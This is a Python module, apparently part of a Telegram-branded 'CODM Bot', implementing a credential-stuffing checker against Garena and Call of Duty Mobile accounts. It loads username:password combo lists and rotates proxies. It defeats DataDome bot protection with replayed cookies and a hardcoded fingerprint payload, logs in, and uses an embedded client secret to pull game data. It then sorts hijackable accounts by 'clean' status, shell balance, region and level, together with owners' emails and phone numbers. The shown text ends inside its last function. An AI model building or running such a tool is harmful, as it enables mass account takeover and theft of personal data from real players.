#!/usr/bin/env python3
# =============================================================================
#  checker.py  —  CODM Account Checker Engine
#  Handles: ProxyManager · CookieManager · DataDomeManager · Garena login
#           CODM account fetch · per-account processing · run-check loop
# =============================================================================

import os, time, json, random, hashlib, re, uuid, base64, logging
import urllib.parse, threading
import concurrent.futures as _cf
from collections import deque
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path
from threading import Lock, Thread

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from Crypto.Cipher import AES
from rich.console import Console

logger  = logging.getLogger("CODM_BOT")
console = Console()

# ---------------------------------------------------------------------------
#  Global timeout — residential proxies need much more headroom than 8 s
# ---------------------------------------------------------------------------
REQ_TIMEOUT = 22   # seconds; used for every HTTP call in this module


# ---------------------------------------------------------------------------
#  Session factory — attaches a urllib3 retry adapter so that
#  transient ConnectionAbortedError / ECONNRESET / 104 errors are
#  retried at the transport layer before bubbling up as exceptions.
# ---------------------------------------------------------------------------
def _build_retry_adapter(total=3, backoff_factor=0.5):
    retry = Retry(
        total=total,
        read=total,
        connect=total,
        backoff_factor=backoff_factor,
        status_forcelist={500, 502, 503, 504},
        allowed_methods={"GET", "POST", "HEAD"},
        raise_on_status=False,
    )
    return HTTPAdapter(max_retries=retry)


def _new_session() -> requests.Session:
    """Create a requests.Session with connection-abort retry baked in."""
    s = requests.Session()
    adapter = _build_retry_adapter(total=3, backoff_factor=0.6)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"Accept-Encoding": "gzip, deflate"})
    return s

# ---------------------------------------------------------------------------
#  Paths (mirrors main.py — resolved relative to this file)
# ---------------------------------------------------------------------------
SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
COMBO_DIR   = os.path.join(SCRIPT_DIR, "Combo")
RESULTS_DIR = os.path.join(SCRIPT_DIR, "Results")
PROXIES_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")
COOKIE_FILE  = os.path.join(SCRIPT_DIR, "fresh_cookie.txt")
BANNED_CK    = os.path.join(SCRIPT_DIR, "banned_cookies.txt")

CODM_REGIONS = {
    "PH": {"name": "Philippines", "flag": "🇵🇭"},
    "SG": {"name": "Singapore",   "flag": "🇸🇬"},
    "MY": {"name": "Malaysia",    "flag": "🇲🇾"},
    "TH": {"name": "Thailand",    "flag": "🇹🇭"},
    "ID": {"name": "Indonesia",   "flag": "🇮🇩"},
    "TW": {"name": "Taiwan",      "flag": "🇹🇼"},
    "VN": {"name": "Vietnam",     "flag": "🇻🇳"},
    "IN": {"name": "India",       "flag": "🇮🇳"},
    "MM": {"name": "Myanmar",     "flag": "🇲🇲"},
    "KH": {"name": "Cambodia",    "flag": "🇰🇭"},
    "BD": {"name": "Bangladesh",  "flag": "🇧🇩"},
    "PK": {"name": "Pakistan",    "flag": "🇵🇰"},
}

# ---------------------------------------------------------------------------
#  Utilities
# ---------------------------------------------------------------------------

def sanitize_string(text):
    if not text or text == "N/A":
        return text
    try:
        return text.encode("ascii", errors="ignore").decode("ascii")
    except Exception:
        return re.sub("[^\\x00-\\x7F]+", "", str(text))


_COMBO_META_KEYS = frozenset({
    "lines", "generated", "source", "auto-delete", "autodelete",
    "quality", "type", "date", "hits", "checked", "total",
    "bad", "errors", "cpm", "wordlist",
})


def clean_account_line(line):
    if not line:
        return None, None
    line = line.strip().lstrip("\ufeff\ufffe")
    line = "".join(c for c in line if c.isprintable() or c == ":")
    if ":" not in line:
        return None, None
    parts = line.split(":", 1)
    acc = sanitize_string(parts[0].strip())
    pwd = sanitize_string(parts[1].strip())
    if not acc or not pwd:
        return None, None
    if acc.lower() in _COMBO_META_KEYS:
        return None, None
    return acc, pwd


def encode(plaintext, key):
    key_b = bytes.fromhex(key)
    pt_b  = bytes.fromhex(plaintext)
    return AES.new(key_b, AES.MODE_ECB).encrypt(pt_b).hex()[:32]


def get_passmd5(password):
    return hashlib.md5(urllib.parse.unquote(password).encode("utf-8")).hexdigest()


def hash_password(password, v1, v2):
    pm    = get_passmd5(password)
    inner = hashlib.sha256((pm + v1).encode()).hexdigest()
    outer = hashlib.sha256((inner + v2).encode()).hexdigest()
    return encode(pm, outer)


def applyck(session, cookie_str):
    session.cookies.clear()
    for item in cookie_str.split(";"):
        item = item.strip()
        if "=" in item:
            try:
                k, v = item.split("=", 1)
                session.cookies.set(k.strip(), v.strip())
            except ValueError:
                pass


def init_ga_cookies(session):
    ts  = int(time.time())
    rid = random.randint(1_000_000_000, 9_999_999_999)
    for name, val in [
        ("_ga", f"GA1.1.{rid}.{ts}"),
        ("_ga_XB5PSHEQB4", f"GS2.1.s{ts}$o1$g0$t{ts}$j53$l0$h0"),
        ("_ga_1M7M9L6VPX",  f"GS2.1.s{ts}$o6$g0$t{ts}$j60$l0$h0"),
    ]:
        session.cookies.set(name, val, domain=".garena.com")


def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    parts = line.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None


def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == "N/A" or not str(mobile_no).strip():
        return "N/A"
    m = str(mobile_no).strip()
    if country_code and country_code != "N/A":
        c = str(country_code).strip()
        if m.startswith(c):
            m = m[len(c):]
        return f"+{c} {m}"
    return m


# ---------------------------------------------------------------------------
#  ProxyManager
# ---------------------------------------------------------------------------
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self._index  = 0
        self._lock   = Lock()
        self._load()

    def _load(self):
        self.proxies = []
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    url = _parse_proxy_line(line)
                    if url:
                        self.proxies.append(url)

    def reload(self):
        """Hot-reload proxies from disk."""
        self._load()

    def get_next(self):
        if not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
        return {"http": proxy, "https": proxy}

    def get_random(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {"http": proxy, "https": proxy}

    def loaded(self): return bool(self.proxies)
    def count(self):  return len(self.proxies)


# ---------------------------------------------------------------------------
#  CookieManager
# ---------------------------------------------------------------------------
class CookieManager:
    def __init__(self):
        self.banned = set()
        self.live   = deque()
        self._lock  = Lock()
        self._load_banned()
        self._load_cookies()

    def _load_banned(self):
        if os.path.exists(BANNED_CK):
            try:
                with open(BANNED_CK, "r") as f:
                    self.banned = {l.strip() for l in f if l.strip()}
            except Exception:
                pass

    def _load_cookies(self):
        if os.path.exists(COOKIE_FILE):
            try:
                with open(COOKIE_FILE, "r") as f:
                    for line in f:
                        ck = line.strip()
                        if ck and ck not in self.banned:
                            self.live.append(ck)
            except Exception:
                pass

    def get_valid(self):
        with self._lock:
            cks = list(self.live)
        if cks:
            random.shuffle(cks)
        return cks

    def save(self, val):
        if not val:
            return
        fmt = val if val.startswith("datadome=") else f"datadome={val}"
        with self._lock:
            if fmt not in self.banned and fmt not in self.live:
                self.live.append(fmt)
                Thread(target=self._append, args=(COOKIE_FILE, fmt), daemon=True).start()

    def mark_banned(self, val):
        fmt = val if "datadome=" in val else f"datadome={val}"
        with self._lock:
            try:
                self.live.remove(fmt)
            except ValueError:
                pass
            if fmt not in self.banned:
                self.banned.add(fmt)
                Thread(target=self._append, args=(BANNED_CK, fmt), daemon=True).start()

    def _append(self, fname, content):
        try:
            with open(fname, "a") as f:
                f.write(content + "\n")
        except Exception:
            pass

    def count(self):
        return len(self.live)


# ---------------------------------------------------------------------------
#  DataDomeManager
# ---------------------------------------------------------------------------
class DataDomeManager:
    def __init__(self):
        self.current = None

    def set(self, v):
        if v:
            self.current = v

    def get(self):
        return self.current

    def extract(self, session):
        v = session.cookies.get("datadome")
        if v:
            self.set(v)
        return v

    def clear_session(self, session):
        try:
            if "datadome" in session.cookies:
                del session.cookies["datadome"]
        except Exception:
            pass

    def apply_session(self, session, v=None):
        self.clear_session(session)
        cv = v or self.current
        if cv:
            session.cookies.set("datadome", cv, domain=".garena.com")
            return True
        return False


# ---------------------------------------------------------------------------
#  DataDome cookie fetcher
# ---------------------------------------------------------------------------
def get_datadome_cookie(session, proxies=None):
    url = "https://datadome.garena.com/js/"
    ts  = int(time.time())
    rid = random.randint(1_000_000_000, 9_999_999_999)
    headers = {
        "content-length":      "6374",
        "sec-ch-ua":           '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-platform":  '"Android"',
        "sec-ch-ua-mobile":    "?1",
        "user-agent":          "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                               "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "content-type":        "application/x-www-form-urlencoded;charset=UTF-8",
        "accept":              "*/*",
        "origin":              "https://sso.garena.com",
        "sec-fetch-site":      "same-site",
        "sec-fetch-mode":      "no-cors",
        "sec-fetch-dest":      "empty",
        "referer":             "https://sso.garena.com/",
        "accept-encoding":     "gzip, deflate, br",
        "accept-language":     "en-PH,en-US;q=0.9,en;q=0.8",
        "cookie": f"_ga_1M7M9L6VPX=GS2.1.s{ts}$o21$g1$t{ts}$j53$l0$h0; "
                  f"_ga=GA1.1.{rid}.{ts}",
    }
    payload = {  # noqa: E501
        "jspl": "QGQ0BVgjckhG9XFf_olrvPEwB5AKErtjUd6f_dtbCw6uU4mUnl4Ca5uJY9K_OWQfTtT2EcX852pDG2IId4gG5U65OppS7iwx7RfQ1zzKRMro56Xwcuu9Q_K16c69frRlWlLQd-n0p6XgiRXwusJv0AzdM9tBXrKAChlwUPvgd1086UwD5VEdfQXn-_xJN7-6-7Fs2LBt0A7vW4CPF6iCHCIKFJHbFFo8uTxvSdJL69AHKqqrRJ8oQCkfO_GrZiTFCXZAbGwdCqzkFEGFeBGH0RVAG_q7wmiKlII3zlcqZcRgoP2awfU6RjhvIeJToH5rTrby8SGuCZXLAGCG2tcCxraVYDQEL63p5anIGBrdTwdGVE6yL8B4vXNXLTIO0iq0AWjCksq599tQ38RAgo0tMl6cix0pOUwpigTNKY",
        "eventCounters": '{"mousemove":4,"pointermove":1,"click":4,"scroll":0,"touchstart":4,"touchend":4,"touchmove":0,"keydown":2,"keyup":2}',
        "jsType":   "le",
        "cid":      "ROxC_oAlhyCRnDuIxNT_gKAsk8IOlYBFcrRuxfab_kt77Rrbyhu8xH21Zm6rN1hshR8R1vYl6Mlq8rC8fFRV7M9NV8EwyGm_EF0dY2yiLhcSRRttpELcrtVbTtmEMGG2",
        "ddk":      "AE3F04AD3F0D3A462481A337485081",
        "Referer":  "https%3A%2F%2Fsso.garena.com%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH",
        "request":  "%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH",
        "responsePage": "origin",
        "ddv":          "5.8.0",
    }
    data = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
    try:
        resp = session.post(url, headers=headers, data=data, proxies=proxies, timeout=REQ_TIMEOUT)
        rj   = resp.json()
        if rj.get("status") == 200 and "cookie" in rj:
            cs = rj["cookie"]
            return cs.split(";")[0].split("=")[1] if ("=" in cs and ";" in cs) else cs
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
#  Garena prelogin  (v1/v2 fetch)
# ---------------------------------------------------------------------------
def prelogin(session, account, dm, cm, retries=6, pm=None):
    for attempt in range(retries):
        try:
            url    = "https://sso.garena.com/api/prelogin"
            params = {
                "app_id":  "10100",
                "account": account,
                "format":  "json",
                "id":      str(int(time.time() * 1000)),
            }
            cks  = session.cookies.get_dict()
            ck_p = [f"{k}={cks[k]}" for k in (
                "apple_state_key", "datadome", "sso_key",
                "_ga", "_ga_XB5PSHEQB4", "_ga_1M7M9L6VPX",
            ) if k in cks]
            hdrs = {
                "Host":             "sso.garena.com",
                "Connection":       "keep-alive",
                "sec-ch-ua":        '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Accept":           "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent":       "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                                    "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site":   "same-origin",
                "Sec-Fetch-Mode":   "cors",
                "Sec-Fetch-Dest":   "empty",
                "Referer":          "https://sso.garena.com/universal/login?app_id=10100"
                                    "&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
                "Accept-Encoding":  "gzip, deflate, br",
                "Accept-Language":  "en-PH,en-US;q=0.9,en;q=0.8",
            }
            if ck_p:
                hdrs["cookie"] = "; ".join(ck_p)

            resp = session.get(url, headers=hdrs, params=params, timeout=REQ_TIMEOUT)

            if resp.status_code == 403:
                # Mark current datadome as banned + rotate proxy + get fresh cookie
                bad_dd = session.cookies.get("datadome") or dm.get()
                if bad_dd and cm:
                    cm.mark_banned(bad_dd)
                if pm and pm.loaded():
                    session.proxies.clear()
                    session.proxies.update(pm.get_next())
                pdict = dict(session.proxies) if session.proxies else None
                # Pool-first: grab a fresh cookie from pool before HTTP call
                fresh = None
                if cm:
                    live_cks = cm.get_valid()
                    if live_cks:
                        val   = random.choice(live_cks)
                        fresh = val.split("=", 1)[1] if "=" in val else val
                if not fresh:
                    fresh = _fetch_datadome_throttled(session, proxies=pdict)
                if fresh:
                    dm.set(fresh)
                    dm.apply_session(session, fresh)
                # No sleep on 403 — just rotate and retry immediately
                continue

            if resp.status_code == 429:
                continue

            resp.raise_for_status()

            try:
                data = resp.json()
            except Exception:
                if attempt < retries - 1:
                    continue
                return None, None, None

            new_dd = resp.cookies.get("datadome")
            if new_dd:
                dm.set(new_dd)

            if "error" in data:
                err_code = data.get("error", "")
                if err_code in ("ACCOUNT DOESNT EXIST", "error_no_account",
                                "error_account_not_found", "error_account"):
                    return "NO_ACCOUNT", None, new_dd
                if attempt < retries - 1:
                    continue
                return None, None, new_dd

            v1, v2 = data.get("v1"), data.get("v2")
            if not v1 or not v2:
                return None, None, new_dd
            return v1, v2, new_dd

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if pm and pm.loaded():
                session.proxies.clear()
                session.proxies.update(pm.get_next())
            # Small jitter lets the residential proxy breathe before the next hit
            time.sleep(random.uniform(0.5, 1.5))
            continue
        except Exception:
            if attempt < retries - 1:
                time.sleep(random.uniform(0.3, 0.8))
                continue

    return "IP_BLOCKED", None, None


# ---------------------------------------------------------------------------
#  Garena login
# ---------------------------------------------------------------------------
def login_account(session, account, password, v1, v2):
    hpw    = hash_password(password, v1, v2)
    url    = "https://sso.garena.com/api/login"
    params = {
        "app_id":       "10100",
        "account":      account,
        "password":     hpw,
        "redirect_uri": "https://account.garena.com/",
        "format":       "json",
        "id":           str(int(time.time() * 1000)),
    }
    cks  = session.cookies.get_dict()
    ck_p = [f"{k}={cks[k]}" for k in ("apple_state_key", "datadome", "sso_key") if k in cks]
    hdrs = {
        "accept":     "*/*",
        "referer":    "https://account.garena.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "Chrome/129.0.0.0 Safari/537.36",
    }
    if ck_p:
        hdrs["cookie"] = "; ".join(ck_p)

    for attempt in range(3):
        try:
            resp = session.get(url, headers=hdrs, params=params, timeout=REQ_TIMEOUT)
            resp.raise_for_status()
            for raw in resp.headers.get("set-cookie", "").split(","):
                if "=" in raw:
                    try:
                        n = raw.split("=", 1)[0].strip()
                        v = raw.split("=", 1)[1].split(";")[0].strip()
                        if n in ("sso_key", "apple_state_key", "datadome"):
                            session.cookies.set(n, v, domain=".garena.com")
                    except Exception:
                        pass
            for k, v in resp.cookies.get_dict().items():
                if k in ("sso_key", "apple_state_key", "datadome"):
                    session.cookies.set(k, v, domain=".garena.com")
            try:
                data = resp.json()
            except Exception:
                if attempt < 2:
                    continue
                return None
            if "error" in data:
                err = data["error"]
                if err in ("ACCOUNT DOESNT EXIST", "error_no_account", "error_auth",
                           "error_user_ban", "error_security_ban"):
                    return f"permanent_fail:{err}"
                if attempt < 2:
                    continue
                return None
            return resp.cookies.get("sso_key") or session.cookies.get("sso_key")
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            # Rotate proxy on connection abort then retry with jitter
            time.sleep(random.uniform(0.5, 1.5))
            if attempt < 2:
                continue
        except requests.RequestException:
            time.sleep(random.uniform(0.3, 0.8))
            if attempt < 2:
                continue
    return None


# ---------------------------------------------------------------------------
#  CODM access token + callback + user-info
# ---------------------------------------------------------------------------
def get_codm_access_token(session):
    try:
        rid       = str(int(time.time() * 1000))
        device_id = f"02-{uuid.uuid4()}"
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_hdrs = {
            "Host":               "100082.connect.garena.com",
            "Connection":         "keep-alive",
            "sec-ch-ua-platform": '"Android"',
            "User-Agent":         "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/"
                                  "AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; "
                                  "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept":             "application/json, text/plain, */*",
            "sec-ch-ua":          '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            "Content-Type":       "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-mobile":   "?1",
            "Origin":             "https://100082.connect.garena.com",
            "X-Requested-With":   "com.garena.game.codm",
            "Sec-Fetch-Site":     "same-origin",
            "Sec-Fetch-Mode":     "cors",
            "Sec-Fetch-Dest":     "empty",
            "Referer":            "https://100082.connect.garena.com/universal/oauth?"
                                  "client_id=100082&locale=en-US&create_grant=true"
                                  "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            "Accept-Encoding":    "gzip, deflate, br, zstd",
            "Accept-Language":    "en-US,en;q=0.9",
        }
        grant_data = f"client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={rid}"
        gr   = session.post(grant_url, headers=grant_hdrs, data=grant_data, timeout=REQ_TIMEOUT)
        gj   = gr.json()
        code = gj.get("code", "")
        if not code:
            return "", "", ""

        token_url  = "https://100082.connect.garena.com/oauth/token/exchange"
        token_hdrs = {
            "User-Agent":      "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Content-Type":    "application/x-www-form-urlencoded",
            "Host":            "100082.connect.garena.com",
            "Connection":      "Keep-Alive",
            "Accept-Encoding": "gzip",
        }
        token_data = (
            f"grant_type=authorization_code&code={code}&device_id={device_id}"
            "&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082"
            "&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        )
        tr = session.post(token_url, headers=token_hdrs, data=token_data, timeout=REQ_TIMEOUT)
        tj = tr.json()
        return tj.get("access_token", ""), tj.get("open_id", ""), tj.get("uid", "")
    except Exception:
        return "", "", ""


def process_codm_callback(session, access_token):
    for cb_url in [
        f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}",
        f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}",
    ]:
        try:
            hdrs = {
                "accept":     "text/html,application/xhtml+xml,*/*;q=0.8",
                "user-agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 Chrome/144.0.0.0",
                "referer":    "https://auth.garena.com/",
            }
            resp = session.get(cb_url, headers=hdrs, allow_redirects=False, timeout=REQ_TIMEOUT)
            loc  = resp.headers.get("Location", "")
            if "err=3" in loc:
                return None, "no_codm"
            if "token=" in loc:
                return loc.split("token=")[-1].split("&")[0], "success"
        except Exception:
            continue
    return None, "error"


def get_codm_user_info(session, token):
    try:
        parts = token.split(".")
        if len(parts) == 3:
            payload = parts[1]
            pad = 4 - len(payload) % 4
            if pad != 4:
                payload += "=" * pad
            ud = json.loads(base64.urlsafe_b64decode(payload)).get("user", {})
            if ud:
                return {
                    "codm_nickname": ud.get("codm_nickname", ud.get("nickname", "N/A")),
                    "codm_level":    ud.get("codm_level", "N/A"),
                    "region":        ud.get("region", "N/A"),
                    "uid":           ud.get("uid", "N/A"),
                }
    except Exception:
        pass
    try:
        url  = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        hdrs = {
            "accept":              "application/json, text/plain, */*",
            "codm-delete-token":   token,
            "origin":              "https://delete-request-aos.codm.garena.co.id",
            "user-agent":          "Mozilla/5.0",
            "x-requested-with":    "com.garena.game.codm",
        }
        resp = session.get(url, headers=hdrs, timeout=REQ_TIMEOUT)
        ud   = resp.json().get("user", {})
        if ud:
            return {
                "codm_nickname": ud.get("codm_nickname", "N/A"),
                "codm_level":    ud.get("codm_level", "N/A"),
                "region":        ud.get("region", "N/A"),
                "uid":           ud.get("uid", "N/A"),
            }
    except Exception:
        pass
    return {}


def check_codm_account(session):
    try:
        at, _, _ = get_codm_access_token(session)
        if not at:
            return False, {}
        ct, status = process_codm_callback(session, at)
        if status != "success" or not ct:
            return False, {}
        info = get_codm_user_info(session, ct)
        return bool(info), info
    except Exception:
        return False, {}


def parse_account_details(data):
    ui   = data.get("user_info", {})
    fb   = ui.get("fb_account", {}) or {}
    mob  = ui.get("mobile_no", "N/A")
    em   = ui.get("email", "N/A")
    ev   = bool(ui.get("email_v", 0))
    mob_na = not mob or mob == "N/A" or not str(mob).strip()
    return {
        "uid":            ui.get("uid", "N/A"),
        "username":       ui.get("username", "N/A"),
        "nickname":       ui.get("nickname", "N/A"),
        "email":          em,
        "email_verified": ev,
        "mobile_no":      mob,
        "country_code":   ui.get("country_code", "N/A"),
        "country":        ui.get("acc_country", "N/A"),
        "shell_balance":  ui.get("shell", 0),
        "fb_username":    fb.get("fb_username", "N/A"),
        "fb_uid":         fb.get("fb_uid", "N/A"),
        "is_clean":       mob_na and not ev,
        "login_history":  data.get("login_history", []),
    }


# ---------------------------------------------------------------------------
#  LiveStats
# ---------------------------------------------------------------------------
class LiveStats:
    def __init__(self):
        self.valid = self.invalid = self.clean = self.not_clean = 0
        self.has_codm = self.no_codm = self.error = 0
        self.highest_level = self.highest_clean_level = self.highest_shell = 0
        self.region_counts: dict = {}
        self._lock      = Lock()
        self.start_time = time.time()
        self.total      = 0

    def update(self, *, valid=False, clean=False, has_codm=False,
               is_error=False, codm_level=0, shell=0, region=None):
        with self._lock:
            if is_error:
                self.error += 1
                return
            if valid:
                self.valid += 1
                if clean:
                    self.clean += 1
                    if codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                else:
                    self.not_clean += 1
                if has_codm:
                    self.has_codm += 1
                    if codm_level > self.highest_level:
                        self.highest_level = codm_level
                    if region and region != "N/A":
                        self.region_counts[region] = self.region_counts.get(region, 0) + 1
                    if shell and int(shell or 0) > self.highest_shell:
                        self.highest_shell = int(shell or 0)
                else:
                    self.no_codm += 1
            else:
                self.invalid += 1

    def processed(self):
        return self.valid + self.invalid + self.error

    def snap(self):
        with self._lock:
            return {
                k: getattr(self, k) for k in (
                    "valid", "invalid", "clean", "not_clean", "has_codm", "no_codm",
                    "error", "highest_level", "highest_clean_level", "highest_shell",
                    "region_counts", "start_time", "total",
                )
            }


# ---------------------------------------------------------------------------
#  ResultsManager
# ---------------------------------------------------------------------------
def get_user_results_dir(user_id):
    d = os.path.join(RESULTS_DIR, str(user_id))
    os.makedirs(d, exist_ok=True)
    return d


class ResultsManager:
    def __init__(self, tag="combo", user_id=None):
        ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_dir = Path(get_user_results_dir(user_id)) if user_id else Path(RESULTS_DIR)
        self.base = base_dir / f"{tag}_{ts}"
        for sub in ("Country", "Level"):
            (self.base / sub).mkdir(parents=True, exist_ok=True)
        self._locks = {}
        self._meta  = Lock()

    def _flock(self, fp):
        fp = str(fp)
        with self._meta:
            if fp not in self._locks:
                self._locks[fp] = Lock()
            return self._locks[fp]

    def _write(self, fp, entry):
        fp = str(fp)
        os.makedirs(os.path.dirname(fp), exist_ok=True)
        with self._flock(fp):
            with open(fp, "a", encoding="utf-8", errors="replace") as f:
                f.write("=" * 60 + "\n" + entry.strip() + "\n" + "=" * 60 + "\n\n")

    def _line(self, fp, line):
        fp = str(fp)
        os.makedirs(os.path.dirname(fp), exist_ok=True)
        with self._flock(fp):
            with open(fp, "a", encoding="utf-8", errors="replace") as f:
                f.write(line + "\n")

    def add(self, ad):
        if ad.get("is_error"):
            return
        entry    = self._fmt(ad)
        combo    = f"{ad.get('account', '')}:{ad.get('password', '')}"
        is_clean = ad.get("is_clean", False)
        has_codm = ad.get("has_codm", False)
        shell    = int(ad.get("shell_balance", 0) or 0)

        self._write(self.base / "All_Valid.txt", entry)
        self._line(self.base / "Valid_Combos.txt", combo)

        if is_clean and has_codm:
            self._write(self.base / "Clean_Accounts.txt", entry)
        if has_codm and not is_clean:
            self._write(self.base / "Not_Clean_Accounts.txt", entry)
        if not has_codm:
            self._write(self.base / "No_CODM.txt", entry)
            return

        if shell > 0:
            self._write(self.base / "Shells_Accounts.txt", entry)

        country = str(ad.get("country", "XX") or "XX").strip().upper()
        self._write(self.base / "Country" / f"{country}.txt", entry)

        lvl    = int(ad.get("codm_level", 0) or 0)
        bucket = ("1-100" if lvl <= 100 else
                  "101-200" if lvl <= 200 else
                  "201-350" if lvl <= 350 else "351+")
        self._write(self.base / "Level" / f"{bucket}.txt", entry)

    def _fmt(self, ad):
        shell = int(ad.get("shell_balance", 0) or 0)
        lines = [
            f"Account    : {ad.get('account', 'N/A')}:{ad.get('password', 'N/A')}",
            f"UID        : {ad.get('uid', 'N/A')}",
            f"Username   : {sanitize_string(ad.get('username', 'N/A'))}",
            f"Nickname   : {sanitize_string(ad.get('nickname', 'N/A'))}",
            f"Email      : {ad.get('email_display', 'N/A')}",
            f"Mobile     : {ad.get('formatted_mobile', 'N/A')}",
            f"Country    : {ad.get('country', 'N/A')}",
            f"Facebook   : {ad.get('fb_info', 'N/A')}",
            f"Shells     : {shell:,}",
            f"Last Login : {ad.get('last_login_date', 'N/A')}",
            f"Login Via  : {ad.get('last_login_where', 'N/A')}",
            f"Status     : {'✓ CLEAN' if ad.get('is_clean') else '✗ NOT CLEAN'}",
        ]
        if ad.get("has_codm"):
            lines += [
                "",
                "[ CODM INFO ]",
                f"CODM Level   : {ad.get('codm_level', 'N/A')}",
                f"CODM Region  : {ad.get('codm_region', 'N/A')}",
                f"CODM IGN     : {sanitize_string(ad.get('codm_nickname', 'N/A'))}",
                f"CODM UID     : {ad.get('codm_uid', ad.get('uid', 'N/A'))}",
            ]
        lines.append("")
        lines.append("Powered by CODM Bot @CodmAndMlbb")
        return "\n".join(lines)

    def get_result_files(self) -> dict:
        candidates = {
            "✨ Clean Accounts":      self.base / "Clean_Accounts.txt",
            "⊘ Not Clean Accounts":  self.base / "Not_Clean_Accounts.txt",
            "💰 Shells Accounts":    self.base / "Shells_Accounts.txt",
            "📋 All Valid":          self.base / "All_Valid.txt",
            "🔑 Valid Combos":       self.base / "Valid_Combos.txt",
            "○ No CODM":             self.base / "No_CODM.txt",
        }
        return {
            label: fp
            for label, fp in candidates.items()
            if fp.exists() and fp.stat().st_size > 0
        }


# ---------------------------------------------------------------------------
#  Thread-local session management
# ---------------------------------------------------------------------------
_tlocal = threading.local()

# Limit concurrent DataDome HTTP fetches — prevents 50 threads all hitting
# datadome.garena.com at once (thundering herd on startup / after 403).
_dd_semaphore = threading.Semaphore(5)


def _fetch_datadome_throttled(session, proxies=None):
    """Fetch a DataDome cookie with concurrency limited to 5 threads at a time."""
    with _dd_semaphore:
        return get_datadome_cookie(session, proxies=proxies)


def _thread_session(state):
    """
    Return (session, dm) for the calling thread.
    Creates them on first call; reuses on subsequent calls.
    DOES NOT block fetching DataDome — threads start immediately and pick up
    a cookie from the pool on the first prelogin 403 if needed.
    """
    if not hasattr(_tlocal, "session"):
        _tlocal.session = _new_session()
        _tlocal.dm = DataDomeManager()
        pm = state.proxy_mgr
        if pm and pm.loaded():
            px = pm.get_next()
            if px:
                _tlocal.session.proxies.update(px)
        cm  = state.cookie_mgr
        cks = cm.get_valid() if cm else []
        if cks:
            # Pool has cookies — grab one without any HTTP call
            val = random.choice(cks)
            dd  = val.split("=", 1)[1] if "=" in val else val
            _tlocal.dm.set(dd)
            _tlocal.dm.apply_session(_tlocal.session, dd)
        # No cookies in pool → just init GA cookies and start immediately.
        # The prelogin 403 handler will fetch a DataDome cookie on demand.
        init_ga_cookies(_tlocal.session)
    return _tlocal.session, _tlocal.dm


def _reset_thread_session(pm, cm):
    """
    Destroy the current thread-local session and build a fresh one.
    Rotates proxy and tries pool for DataDome; does NOT block on HTTP fetch —
    prelogin's 403 handler will get a fresh cookie on the next attempt.
    """
    if hasattr(_tlocal, "session"):
        try:
            _tlocal.session.close()
        except Exception:
            pass
        del _tlocal.session
    if hasattr(_tlocal, "dm"):
        del _tlocal.dm

    sess = _new_session()
    dm_new = DataDomeManager()

    if pm and pm.loaded():
        px = pm.get_next()
        if px:
            sess.proxies.update(px)

    init_ga_cookies(sess)

    # Pool-first — no blocking HTTP call here
    if cm:
        cks = cm.get_valid()
        if cks:
            val = random.choice(cks)
            dd  = val.split("=", 1)[1] if "=" in val else val
            dm_new.set(dd)
            dm_new.apply_session(sess, dd)

